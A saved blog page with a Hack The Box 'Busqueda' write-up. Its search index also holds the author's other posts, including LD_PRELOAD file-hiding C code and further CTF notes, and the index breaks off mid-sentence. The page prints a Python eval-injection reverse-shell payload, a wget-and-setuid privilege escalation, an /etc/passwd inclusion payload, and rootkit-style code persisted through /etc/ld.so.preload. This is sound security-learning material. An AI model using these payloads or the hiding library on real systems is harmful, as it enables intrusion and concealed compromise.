<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"}>
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1b" />

    <meta name="description" content="Hack The Box - Busqueda [Easy]">

    
        <title>Hack The Box - Busqueda [Easy] | My New Hugo Site</title>
    

    
    <style>
        :root {
          --background: #ffffff;
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --background: #1b1b1b;
          }
        }
        html {
            background-color: var(--background);
        }
        body {
            background-color: var(--background);
        }
    </style>

    
    <link rel="stylesheet" type="text/css" href="/style.min.dd7f4d768263b31dca99ccfd082ebb2574963449605bddaf5e9b91272f83dff2.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
          </ul>
        </nav>
        




<div id="single-header">
  <h1>
    Hack The Box - Busqueda [Easy]
  </h1>
  <div id="single-meta">
    
        <p id="subtitle">HTB Writeup</p>
    
      

  </div>
</div>





<main><p>This machine is rather simple, upon scanning it we can see that the website has a generating search query URLs input form. On the bottom of the page, we can see the versions of the used software:</p>
<pre tabindex="0"><code>Powered by Flask and Searchor 2.4.0

$ whatweb 
Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
</code></pre><p>A simple google search would yield a bug that has been removed in Searchor 2.4.2+ and before that <code>eval()</code> was used in the Searchor CLI module. Assuming that the website uses that, we can send the following payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /search HTTP/1.1
</span></span><span style="display:flex;"><span>Host: searcher.htb
</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">67</span>
</span></span><span style="display:flex;"><span>Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Origin: http://searcher.htb
</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/110.0.5481.78 Safari/537.36
</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.7
</span></span><span style="display:flex;"><span>Referer: http://searcher.htb/
</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.9
</span></span><span style="display:flex;"><span>Connection: close
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>engine<span style="color:#f92672">=</span>Accuweather&amp;query<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;,copy_url=__import__(&#39;</span>os<span style="color:#e6db74">&#39;).system(&#34;&#34;&#34; python3 -c &#39;</span>import socket,subprocess,os;s<span style="color:#f92672">=</span>socket.socket<span style="color:#f92672">(</span>socket.AF_INET,socket.SOCK_STREAM<span style="color:#f92672">)</span>;s.connect<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;&lt;myip&gt;&#34;</span>,4444<span style="color:#f92672">))</span>;os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,0<span style="color:#f92672">)</span>; os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,1<span style="color:#f92672">)</span>;os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,2<span style="color:#f92672">)</span>;import pty; pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;bash&#34;</span><span style="color:#f92672">)</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#e6db74">&#34;&#34;&#34;))
</span></span></span></code></pre></div><p>This would create a reverse shell to the machine.</p>
<p>The currently used user is <code>svc</code> upon running</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo -l
</span></span></code></pre></div><p>We can see that we can use this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
</span></span><span style="display:flex;"><span>$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;
</span></span><span style="display:flex;"><span>$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
</span></span></code></pre></div><p>I also discovered the <code>/opt/scripts</code> folder that had some scripts inside, including <code>full-checkup.sh</code>, I&rsquo;ve run the command in the <code>/opt/scripts/</code> folder, and it successfully retrieved some information about the currently running services, I tried to run it in a different folder, and it gave me <code>Something went wrong</code>, I&rsquo;ve created a dummy <code>full-checkup.sh</code> with <code>chmod +s /bin/bash</code> contents inside and ran the command again, it just printed out <code>[+] Done</code> and after that a simple <code>bash -p</code> gave me root user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cd /tmp <span style="color:#f92672">&amp;&amp;</span> wget http://&lt;ip&gt;:8000/full-checkup.sh <span style="color:#f92672">&amp;&amp;</span> chmod +x ./full-checkup.sh 
</span></span><span style="display:flex;"><span>$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
</span></span><span style="display:flex;"><span>$ bash -p
</span></span><span style="display:flex;"><span>$ cat /root/root.txt
</span></span></code></pre></div></main>




<br>

<footer>

<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>

<script>
window.store = {
    
    "http:\/\/localhost:1313\/": {
        "title": "My New Hugo Site",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/"
    },
    
    "http:\/\/localhost:1313\/posts\/example\/": {
        "title": "Posgggggggggge",
        "tags": [],
        "content": "asdasdsa ", 
        "url": "http:\/\/localhost:1313\/posts\/example\/"
    },
    
    "http:\/\/localhost:1313\/posts\/": {
        "title": "Posts",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/posts\/"
    },
    
    "http:\/\/localhost:1313\/categories\/": {
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/categories\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2022-05-23-create-plugin-architecture-with-python\/": {
        "title": "Create Plugin Architecture With Python",
        "tags": [],
        "content": "There are some use-cases where a plugin architecture is needed, I call this \u0026ldquo;code\u0026rdquo; plugins but it is quite possible that there is already a word for that. The idea is to \u0026rsquo;load\u0026rsquo; functions or classes that are dynamically created so that you can have the reference to the instances at runtime. I\u0026rsquo;ve created 2 solutions for that matter one that is using the __subclasses__ dunder method and one using a decorator.\nSolution 1 Repository: https://github.com/syrull/plugin-arch-python/tree/main/Solution-1 SOLUTION-1 │ configuration.py │ main.py │ README.md │ setup.py │ └───actions action_example1.py action_example2.py __init__.py Loading the __subclasses__ of the BaseAction class and creating a \u0026lsquo;pluggable\u0026rsquo; classes. The actions can be specified in the configuration.py file in the ACTIONS const. This method is inspired by django\u0026rsquo;s INSTALLED_APPS method.\nThe call method is a placeholder for the \u0026ldquo;actions\u0026rdquo;.\nTo Register an action New python file in actions/ folder Create a class with an appropriate name (ex. ClickAction) Extend the class with BaseAction Add an entry to ACTIONS const located in configuration.py file with the approriate path to the module After that the function will be available at the register in the main.py file.\n$ python main.py [\u0026lt;class \u0026#39;actions.action_example1.Example1Action\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;actions.action_example2.Example2Action\u0026#39;\u0026gt;] Benchmarks Measure-Command { python .\\main.py } Days : 0 Hours : 0 Minutes : 0 Seconds : 0 Milliseconds : 24 Ticks : 240745 TotalDays : 2.78640046296296E-07 TotalHours : 6.68736111111111E-06 TotalMinutes : 0.000401241666666667 TotalSeconds : 0.0240745 TotalMilliseconds : 24.0745 Solution 2 Repository: https://github.com/syrull/plugin-arch-python/tree/main/Solution-2 SOLUTION-2 │ main.py │ README.md │ register.py │ └───actions action_example1.py action_example2.py __init__.py The benefits of this solution are that we have a control over the decorator and we can pass some custom *args, **kwargs to the decorated functions.\nTo Register an action New python file in actions/ folder Create function with an appropriate name (ex. action_onclick) Decorate the function with register_action decorator Export the function in the __all__ method in actions/__init__.py file After that the function will be available at the register in the main.py file.\n$ python main.py [\u0026lt;function action_example1 at 0x000001CC3F88D310\u0026gt;, \u0026lt;function action_example2 at 0x000001CC3F88D3A0\u0026gt;] Benchmarks Measure-Command { python .\\main.py } Days : 0 Hours : 0 Minutes : 0 Seconds : 0 Milliseconds : 22 Ticks : 227803 TotalDays : 2.6366087962963E-07 TotalHours : 6.32786111111111E-06 TotalMinutes : 0.000379671666666667 TotalSeconds : 0.0227803 TotalMilliseconds : 22.7803 ", 
        "url": "http:\/\/localhost:1313\/posts\/2022-05-23-create-plugin-architecture-with-python\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2022-10-02-dynamic-linker-hijacking-experiments\/": {
        "title": "Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)",
        "tags": [],
        "content": "Overview Recently I heard about a new malware called Symbiote , which the researches are calling the \u0026ldquo;Nearly-Impossible-to-Detect Linux Threat\u0026rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I\u0026rsquo;ve started to research it.\nI highly advise you to read through these articles first before we begin with the actual post:\nHijack Execution Flow: Dynamic Linker Hijacking What Is the LD_PRELOAD? What is a Shared Library? Implementation I decided to implement a very simple alternative of the evasive techniques that this malware uses just as a proof of concept and if you already read the articles that I\u0026rsquo;ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.\nWhat do we need first and how to hide a file from lets say a command like ls? With a little bit of investigating of how the ls works internally through the source code and the linux manual page We can see that internally we have a function that is called print_dir. I\u0026rsquo;ve truncated the comments of the original source code.\n... static void print_dir (char const *name, char const *realname, bool command_line_arg) ... If we continue further down the function we can see the loop that actually iterates over the files\n... while (true) { errno = 0; next = readdir (dirp); // Here we can see that the loop iterates over readdir as long // as the pointer that readdir returns isn\u0026#39;t null and the errno != 0 if (next) { if (! file_ignored (next-\u0026gt;d_name)) // we can see here that it the filename is // taken from the next variable, lets look through the source code of `readdir` { ... Let\u0026rsquo;s confirm that by invoking nm this will show us the dynamic symbols that are being loaded from shared libs.\n$ nm -D /usr/bin/ls | grep \u0026#34;readdir\u0026#34; U readdir@GLIBC_2.2.5 Now I concluded that I need to search into the source code of readdir which is located here and the linux manual page . The description more or less describes exactly what we concluded from the source code of ls.c. Lets see where we set that d_name variable.\n#include \u0026lt;dirent.h\u0026gt; struct dirent *readdir(DIR *dirp); // Signature of the readdir struct dirent { ino_t d_ino; /* Inode number */ off_t d_off; /* Not an offset; see below */ unsigned short d_reclen; /* Length of this record */ unsigned char d_type; /* Type of file; not supported by all filesystem types */ char d_name[256]; /* Null-terminated filename */ }; ⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the dirent structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that d_name will exists since this field must be implemented on all POSIX systems.\nAlright, let\u0026rsquo;s start implementing our own function readdir that we will wrap the original one with.\nintercept_readdir.c #define _GNU_SOURCE #include \u0026lt;dirent.h\u0026gt; // Including the Directory Entry structure // The dynamic linking header file so we can use the dlsym // which will give us the address for the readdir symbol #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; // So we can use the strstr struct dirent *readdir(DIR *dirp) { struct *(handle)(DIR *); // https://man7.org/linux/man-pages/man3/dlsym.3.html // Search for RTLD_NEXT, basically it allow us to wrap // the original function handle = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;) struct dirent *dp; // Iterating over the return values of our original `readdir` while((dp = handle(dirp))) { // if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-\u0026gt;d_name`) // break the loop and go to the next entry, essentially skipping our file. if(strstr(dp-\u0026gt;d_name, \u0026#34;syl.lys\u0026#34;) == 0) break; } return dp; } This is what our final version of wrapper for readdir would look like. Now let\u0026rsquo;s try to compile it.\n$ gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl Flags:\nfPIC -shared creates a shared object -D_GNU_SOURCE flag / _GNU_SOURCE - TLDR: We need it for RTLD_NEXT -ldl Now that we have shared object (*.so) file lets see how to use it in action.\nHow to overwrite the exported symbols? LD_PRELOAD What is LD_PRELOAD? I advise you to read that first to get a better understanding of how it works.\nThe next thing that we are going to do is to test our shared library and see if it works. Lets run ls with our libhidemyfile.so loaded before anything else.\n$ ls libhidemyfile.so syl.lys $ LD_PRELOAD=./libhidemyfile.so ls libhidemyfile.so As you can see we successfully implement a shared library that hides our file from ls, and not only that command, every command that uses readdir won\u0026rsquo;t be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing LD_PRELOAD in front of every command.\n/etc/ld.so.preload If you read carefully the man pages for LD_PRELOAD you should know that you won\u0026rsquo;t be able to override functions in the standard search directories without properly setting your set-user-ID permissions.\nInstead we are going to use the /etc/ld.so.preload which does not suffer from these restrictions. This suffers from requiring root privileges but c\u0026rsquo;mon.. if you are here you will get those!\nWe first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.\n$ sudo mv ./libhidemyfile.so /lib/libhidemyfile.so Then we just need to place our library dir in ld.so.preload file.\n$ sudo echo \u0026#34;/lib/libhidemyfile.so\u0026#34; \u0026gt; /etc/ld.so.preload And if everything is good, executing ls or any of its aliases will hide our file from the output. Let\u0026rsquo;s verify this by using ldd\n$ ldd /bin/ls linux-vdso.so.1 (0x00007ffc0c8e2000) /lib/libhidemyfile.so (0x00007f00e59e4000) \u0026lt;--- Here it is! libselinux.so.1 =\u0026gt; /lib64/libselinux.so.1 (0x00007f00e5997000) libcap.so.2 =\u0026gt; /lib64/libcap.so.2 (0x00007f00e598d000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007f00e5600000) libpcre2-8.so.0 =\u0026gt; /lib64/libpcre2-8.so.0 (0x00007f00e58f0000) /lib64/ld-linux-x86-64.so.2 (0x00007f00e5a0f000) For your convenience I\u0026rsquo;ve setup a Docker container that you can use with ld.so.preload setup\n$ docker run -it --rm sylly/ctf_findme End If you reached here, thank you so much for the read. In the next part I will try to \u0026ldquo;completely\u0026rdquo; hide it from the system because now if we cat it despite not \u0026ldquo;reading\u0026rdquo; it in the directory would print us the contents of the file, but that will be the subject of the next post.\nFull Source Code Resources This post wouldn\u0026rsquo;t be possible without:\nhttps://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/ https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf https://attack.mitre.org/techniques/T1574/006/ https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/ https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/ https://blog.jessfraz.com/post/ld_preload/ ", 
        "url": "http:\/\/localhost:1313\/posts\/2022-10-02-dynamic-linker-hijacking-experiments\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2022-10-04-dynamic-linker-hijacking-experiments-2\/": {
        "title": "Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)",
        "tags": [],
        "content": "Journey Post This post is a something that I call \u0026ldquo;journey post\u0026rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like \u0026lt;journey\u0026gt; so that you can skip it if you are in a hurry.\nOverview In the last post I\u0026rsquo;ve described how I hid a file from all the sys calls that are using readdir. In this post I will try to hide it from the cat command. Let\u0026rsquo;s first examine/reverse engineer how the cat command works internally.\nNaturally I would start with a simple strace which will trace the system calls and signals that the command uses.\n$ which cat /usr/bin/cat $ strace /usr/bin/cat syl.lys execve(\u0026#34;/usr/bin/cat\u0026#34;, [\u0026#34;/usr/bin/cat\u0026#34;, \u0026#34;syl.lys\u0026#34;], 0x7ffca9c17508 /* 68 vars */) = 0 ... access(\u0026#34;/etc/ld.so.preload\u0026#34;, R_OK) = -1 ENOENT (No such file or directory) // WINK WINK, not yet ... openat(AT_FDCWD, \u0026#34;syl.lys\u0026#34;, O_RDONLY) = 3 The most interesting sys call in the output is openat so lets see the source code of openat.c . Here we can see the char const *file that variable is what holds our filename (look at the strace output). After that, I followed our steps in the last post by implementing a function with the same signature and wrapping the original one.\n\u0026lt;journey\u0026gt;\nAfter a few tries I was quick to realize that there is some issue. The wrapper that I\u0026rsquo;ve implemented didn\u0026rsquo;t work, or at least didn\u0026rsquo;t work all the time. I\u0026rsquo;ve tested it out with a simple program that would just call it and in there it worked, I didn\u0026rsquo;t quite get why it does what it does but I found the following discussions:\nintercepting the openat() system call for GNU tar How to find out what functions to intercept with LD_PRELOAD? As it turns out (my best guess) the sys call that I am trying to override openat is probably not the one that the cat uses. I decided to look at the source code for [cat.c][https://github.com/coreutils/coreutils/blob/master/src/cat.c] and search for everything that has *open* in it.\nI found on line 686 a call to the open. An important note here is that this open call here is not the sys call but the call in the std lib which will call the related system call for us. So I\u0026rsquo;ve decided to change my approach and override the open function instead.\n\u0026lt;/journey\u0026gt;\nHow does the open function work? I wouldn\u0026rsquo;t try to explain something that I am hardly good at so it is best for you to read the man pages for that one.\nLet\u0026rsquo;s start by copying the signature of the open function and wrap it.\nstatic int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } In this code block I\u0026rsquo;ve wrapped the original open function with our implementation of the open function. What is left now is to add our \u0026ldquo;malicious\u0026rdquo; part to it.\nif (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; // Setting up the error to be ERROR NO ENTRY(ENOENT) return -1; // Returning -1 (failure) } And lastly all together\nintercept_open.c #define _GNU_SOURCE #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #define MALICIOUS_FILE \u0026#34;syl.lys\u0026#34; static int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } Let\u0026rsquo;s see if its working\u0026hellip;\n$ ls intercept_open.so syl.lys $ LD_PRELOAD=./intercept_open.so cat syl.lys cat: syl.lys: No such file or directory As you can see the cat command returns No such file or directory which is exactly what we are aiming for.\nCombining it with our readdir We created a malicious open function that wraps the original one from the standard lib, lets now combine it with the readdir from the previous post into a single shared object.\nmalicious.c #define _GNU_SOURCE #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define MALICIOUS_FILE \u0026#34;syl.lys\u0026#34; static int (*original_open)(const char *filename, int flags, ...) = NULL; struct dirent *(*original_readdir)(DIR *dirp) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } struct dirent *readdir(DIR *dirp) { struct dirent *ret; original_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); while((ret = original_readdir(dirp))) { if(strstr(ret-\u0026gt;d_name, MALICIOUS_FILE) == 0) break; } return ret; } Let\u0026rsquo;s test it out, supposedly we shouldn\u0026rsquo;t get entries from ls and cat.\n$ touch syl.lys $ ls intercept_open.c malicious.c malicious.so syl.lys $ export LD_PRELOAD=./malicious.so $ ls intercept_open.c malicious.c malicious.so README.md $ cat syl.lys cat: syl.lys: No such file or directory End With that I am concluding this post, again if you reached here thank you so much it means a lot! In the next part I will get deeper and make our malicious file to be running and beaconing a malicious C2 server, we will look through some C2 communication examples using the DNS protocol so that we can remain under the radar(or the firewall ^^).\nFull Source Code Resources This post wouldn\u0026rsquo;t be possible without:\nhttps://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-5.html https://linux.die.net/man/2/openat And some kind StackOverflow users! ", 
        "url": "http:\/\/localhost:1313\/posts\/2022-10-04-dynamic-linker-hijacking-experiments-2\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-02-09-htb-broscience\/": {
        "title": "Hack The Box - Broscience [Medium]",
        "tags": [],
        "content": " Short Overview The video consist of my process of enumeration and overall hacking the machine, please use this as a walkthrough.\nThis box consist of several vulnerabilities:\nLocal File Inclusion/Path traversal - The query string path= in the img.php file is vulnerable to that, with that we can download the site map that I\u0026rsquo;ve discovered using Burp Deserialization / PHP Object Injection - I saw that in the utils.php file, and I\u0026rsquo;ve prepared a payload for the AvatarInterface since this is the class that is using magic methods, and it has the file_get_contents function that we are going to use to pull the PHP reverse shell. Linux Privilege Escalation - By pure luck, I noticed the renew_cert.sh in the /opt/ folder, and I immediately noted that this must be the vector that needs to be leveraged to gain privilege escalation. A much better way to figure out this can be the pspy tool, which could have shown me this command that is being run as root: timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt and I did look up for some hints, thanks to gatogamer1155 and his writeup for this machine. ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-02-09-htb-broscience\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-06-10-htb-busqueda\/": {
        "title": "Hack The Box - Busqueda [Easy]",
        "tags": [],
        "content": "This machine is rather simple, upon scanning it we can see that the website has a generating search query URLs input form. On the bottom of the page, we can see the versions of the used software:\nPowered by Flask and Searchor 2.4.0 $ whatweb Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2] A simple google search would yield a bug that has been removed in Searchor 2.4.2+ and before that eval() was used in the Searchor CLI module. Assuming that the website uses that, we can send the following payload:\nPOST /search HTTP/1.1 Host: searcher.htb Content-Length: 67 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://searcher.htb Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://searcher.htb/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close engine=Accuweather\u0026amp;query=\u0026#39;,copy_url=__import__(\u0026#39;os\u0026#39;).system(\u0026#34;\u0026#34;\u0026#34; python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;\u0026lt;myip\u0026gt;\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\u0026#34;bash\u0026#34;)\u0026#39; \u0026#34;\u0026#34;\u0026#34;)) This would create a reverse shell to the machine.\nThe currently used user is svc upon running\n$ sudo -l We can see that we can use this command:\n$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \u0026lt;format\u0026gt; \u0026lt;container_name\u0026gt; $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup I also discovered the /opt/scripts folder that had some scripts inside, including full-checkup.sh, I\u0026rsquo;ve run the command in the /opt/scripts/ folder, and it successfully retrieved some information about the currently running services, I tried to run it in a different folder, and it gave me Something went wrong, I\u0026rsquo;ve created a dummy full-checkup.sh with chmod +s /bin/bash contents inside and ran the command again, it just printed out [+] Done and after that a simple bash -p gave me root user.\n$ cd /tmp \u0026amp;\u0026amp; wget http://\u0026lt;ip\u0026gt;:8000/full-checkup.sh \u0026amp;\u0026amp; chmod +x ./full-checkup.sh $ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup $ bash -p $ cat /root/root.txt ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-06-10-htb-busqueda\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-02-17-htb-encoding\/": {
        "title": "Hack The Box - Encoding [Medium]",
        "tags": [],
        "content": "This machine took me a couple of days due to its complexity and some minor stuff that were a hassle to get right.\nYou will find the following vulnerabilities: - Local File Inclusion - Command Injection or RCE Flag 1 I started by looking through the website to get some idea of its functionality. I saw that this is some sort of converter of data, like binary to hex and so on. But the interesting part was this:\nIf required, you can specify a URL that will return data to be converted with the file_url parameter. This can be done for both string and integer convertions.\nThat quickly reminded me of local/remote file inclusion, and so I\u0026rsquo;ve tried it with the following payload:\njson_data = { \u0026#39;action\u0026#39;: \u0026#39;b64encode\u0026#39;, \u0026#39;file_url\u0026#39; : \u0026#39;file:///etc/passwd\u0026#39; } That gave me the contents of the /etc/passwd file encoded in base64, I used base64 -d to decode it. From there I saw another user svc.\nI was also curious what\u0026rsquo;s in the /var/www/ directory, so I began enumerating the directory.\nI ran ffuf on the main website haxtables.htb/FUZZ also ran ffuf for subdomain discovery.\n$ ffuf -w $disc_wc/raft-small-directories-lowercase.txt -u http://haxtables.htb/FUZZ $ ffuf -w $disc_wc/common.txt -u http://haxtables.htb/ -H \u0026#34;Host: FUZZ.haxtables.htb\u0026#34; -fs 1999 With those I found api, image subdomains, so I inspected them via the LFI vulnerability /var/www/image/index.php to check whether this application 